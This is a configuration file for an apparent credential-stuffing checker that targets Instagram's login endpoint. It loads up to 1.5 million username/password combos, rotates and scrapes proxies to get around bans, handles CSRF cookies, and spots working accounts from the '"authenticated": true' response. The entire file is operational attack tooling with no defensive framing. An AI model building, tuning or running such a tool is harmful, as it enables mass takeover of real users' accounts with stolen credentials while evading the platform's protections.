

# Main Script
combos_max = 1500000  # maximum number of combos to load into memory

# Proxy Manager
proxies_minimum = 1500  # if proxy list is smaller, proxies get scraped
proxy_ban_time = 30  # time to wait before using proxy again if it has been banned
proxy_minimum_attempts = 5  # minimum attempts proxy has to do before calculating success ratio
proxy_success_ratio = 1.5  # = tested / retries
proxy_timeout = 5  # time to wait before using proxy again

# Browser
auth_ssl = True
connection_timeout = 7
header_items = []  # <header_item_name>;<header_item_value>
header_items_cookies = ['X-CSRFToken;csrftoken']  # <header_item_name>;<cookie_name> (value is cookie's value)
home_url = 'https://www.instagram.com/'
login_url = 'https://www.instagram.com/accounts/login/ajax/'
post_data = {'username': '{username}', 'password': '{password}'}  # use {username} and {password}
response_success = '"authenticated": true'  # if this is somewhere in response, credentials worked
response_error = 'error'  # if this is somewhere in response, there was an error
